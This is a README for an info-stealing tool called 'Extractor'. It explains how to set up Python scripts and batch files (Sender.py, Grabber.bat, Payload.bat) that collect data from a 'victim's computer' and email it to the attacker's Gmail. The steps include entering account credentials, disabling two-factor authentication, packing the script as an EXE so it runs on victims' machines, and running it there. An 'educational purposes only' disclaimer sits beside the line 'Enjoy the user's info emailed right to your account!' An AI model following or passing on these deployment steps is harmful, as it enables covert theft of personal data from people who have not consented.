# Extractor

Snag info from a victim's computer and send it to a gmail account (Can send the email to itself).

I DO NOT CONDONE ANY MAILICIOUS ACTION THAT IS USED WITH MY PROGRAM, IT IS SIMPLY FOR EDUCATIONNAL PURPOSES ONLY!!!

READ ALL THE INSTRUCTIONS FOR IT TO WORK!

Follw these steps to get this up and running.

1. You need python 3.8 (python.org) installed.

2. You must clone this repository the way you want.

3. Edit the Sender.py to fit your needs. (I only tested this with gmail, if you wish to use this with another service, you may proceed).
    
    Line 9:  Replace the "FROM@GMAIL.COM" for your email "example@gmail.com".
    
    Line 10: Replace the 'TO@GMAIL.COM' for the receiver's email 'example@gmail.com' (You can use the same as the sender's).
    
    Line 35: Replace the "PASSWORD" with your password for your gmail account. (This will go to gmail's servers and nothing more).

4. Go to your gmail account settings and disable 2-factor authentication and enable third party use.

5. Convert the .py to an EXE file so your victim may proceed without pyhon installed. (I DO NOT TAKE OWNERSHIP OF THIS PROGRAM).

6. Once on the victim's pc you may run the Grabber.bat.

Make sure that the final names are Grabber.bat, Sender.exe and Payload.bat (YOU NEED BOTH FILES IN THE SAME PATH FOR IT TO WORK).

The file Grabber.bat is not compatible with my .bat to .exe converter.

Done. Enjoy the user's info emailed right to your account!

If you encounter any issue please report it in the issues tab.
